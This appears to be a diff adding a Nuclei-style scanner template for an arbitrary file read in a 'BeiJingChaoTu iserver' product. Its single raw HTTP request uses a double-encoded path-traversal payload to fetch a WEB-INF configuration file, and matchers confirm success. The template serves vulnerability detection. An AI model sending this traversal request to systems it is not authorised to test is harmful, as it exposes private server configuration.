@@ -1,0 +1,28 @@
+id: BeiJingChaoTu-iserver-ReadAnyFile
+
+info:
+  name: BeiJingChaoTu-iserver-ReadAnyFile
+  author: iSee857
+  severity: high
+  description: |
+    BeiJingChaoTu-iserver-ReadAnyFile.
+
+http:
+  - raw:
+      - |
+        GET /iserver/output/../WEB-IN%2546/iserver-system.xml HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "<provider-types"
+          - "<?xml"
+          - "properties"
+        condition: and
+        part: body
+
+      - type: status
+        status:
+          - 200
